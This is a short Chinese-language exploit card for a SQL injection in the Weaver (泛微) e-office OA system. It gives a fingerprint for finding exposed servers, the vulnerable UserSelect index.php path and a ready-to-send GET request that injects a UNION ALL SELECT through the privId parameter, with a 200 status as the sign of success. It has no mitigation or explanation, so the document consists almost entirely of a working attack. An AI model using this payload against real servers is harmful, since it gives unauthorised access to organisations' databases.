# 泛微e-officeindex.phpsql注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`header="general/login/index.php"`
- **请求**：`GET /E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))-- HTTP/1.1`

**Payload**
```
GET /App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))-- HTTP/1.1
Content-Type: application/json
Host:
```
- **响应特征**：200